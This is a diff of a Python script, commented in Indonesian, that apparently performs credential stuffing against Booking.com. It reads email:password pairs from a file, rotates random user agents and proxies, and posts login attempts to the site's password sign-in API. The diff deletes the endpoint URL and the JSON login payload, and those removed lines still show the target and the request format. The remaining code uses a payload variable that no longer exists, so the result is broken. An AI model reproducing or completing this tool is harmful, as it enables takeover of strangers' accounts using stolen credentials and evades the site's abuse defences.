@@ -54,13 +54,11 @@ def get_proxy():
 # Gunakan fungsi untuk menghasilkan user-agent secara acak
 user_agent = generate_random_user_agent()
 
-# URL untuk permintaan POST
-url = 'https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit'
+
 
 # Header untuk permintaan POST
 headers = {
     'User-Agent': user_agent,
-    'X-Booking-Client': 'ap',
     'X-Requested-With': 'XMLHttpRequest',
     'Content-Type': 'application/json'
 }
@@ -80,19 +78,6 @@ with open('empas.txt', 'r') as file:
         email, password = line.split(':')
         
         # Buat payload JSON
-        payload = {
-            "context": {
-                "value": ""
-            },
-            "identifier": {
-                "type": "IDENTIFIER_TYPE__EMAIL",
-                "value": email
-            },
-            "authenticator": {
-                "type": "AUTHENTICATOR_TYPE__PASSWORD",
-                "value": password
-            }
-        }
         
         # Ubah payload menjadi JSON
         data = json.dumps(payload)
